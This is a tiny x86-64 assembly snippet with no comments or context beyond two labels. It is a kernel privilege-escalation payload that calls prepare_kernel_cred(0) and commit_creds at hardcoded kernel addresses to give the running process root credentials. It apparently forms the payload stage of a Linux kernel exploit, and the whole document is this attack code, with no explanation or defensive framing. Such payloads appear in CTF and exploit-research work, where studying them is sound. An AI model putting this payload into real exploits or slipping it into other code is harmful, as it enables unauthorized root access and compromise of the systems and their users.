global _start
_start:
    xor rdi, rdi 
    mov rdx, 0xffffffff8104f850 ; prepare_kernel_cred(0)
    call rdx
    mov rdi, rax
    mov rdx, 0xffffffff8104f520; commit_creds
    call rdx
    ret
